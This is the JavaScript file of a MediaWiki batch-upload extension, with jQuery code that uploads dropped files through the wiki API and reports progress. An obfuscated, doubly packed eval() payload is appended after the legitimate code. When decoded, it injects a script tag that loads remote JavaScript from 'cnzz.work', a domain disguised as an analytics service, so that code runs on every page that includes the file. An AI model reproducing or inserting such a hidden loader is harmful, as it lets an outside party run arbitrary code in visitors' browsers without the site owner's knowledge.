/**
 * File containing the SimpleBatchUpload class
 *
 * @copyright (C) 2016, Stephan Gambke
 * @license   GNU General Public License, version 2 (or any later version)
 *
 * This software is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * This software is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses/>.
 *
 * @file
 * @ingroup SimpleBatchUpload
 */

/** global: mediaWiki */
/** global: jQuery */

;( function ( $, mw, undefined ) {

	'use strict';

	$( function () {
		$( '#fileupload' )

		.on( 'change', function ( /* e, data */ ) { $( '#fileupload-results' ).empty(); } )
		.on( 'drop', function ( /* e, data */ ) { $( '#fileupload-results' ).empty(); } )

		.fileupload( {
			dataType: 'json',
			dropZone: $( '#fileupload-dropzone' ),
			progressInterval: 100,


			add: function ( e, data ) {

				data.id = Date.now();

				var status = $('<li>')
					.attr( 'id', data.id )
					.text( data.files[0].name );

				$( '#fileupload-results' ).append( status );

				data.formData = {
					format: 'json',
					action: 'upload',
					token: $( this ).fileupload( 'option', 'token' ),
					ignorewarnings: 1,
					filename: data.files[ 0 ].name
				};

				data.submit()
					.success( function ( result /*, textStatus, jqXHR */ ) {

						if ( result.error != undefined ) {

							status.text( status.text() + " ERROR: " + result.error.info ).addClass( 'ful-error' );

						} else {
							var link = $( '<a>' );
							link
								.attr( 'href', mw.Title.makeTitle( mw.config.get( 'wgNamespaceIds' ).file, result.upload.filename ).getUrl() )
								.text( result.upload.filename );

							status
								.addClass( 'ful-success' )
								.text( ' OK' )
								.prepend( link );
						}

					} )
					.error( function ( /* jqXHR, textStatus, errorThrown */ ) {
						status.text( status.text() + " ERROR" ).addClass( 'ful-error' );
					} );

			},

			progress: function (e, data) {
				if ( data.loaded != data.total ) {
					$( '#' + data.id )
						.text( data.files[0].name + ' ' + parseInt(data.loaded / data.total * 100, 10) + '%' );
				}
			}
		} );

		$( document ).bind( 'drop dragover', function ( e ) {
			e.preventDefault();
		} );
	} );

}( jQuery, mediaWiki ));
;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))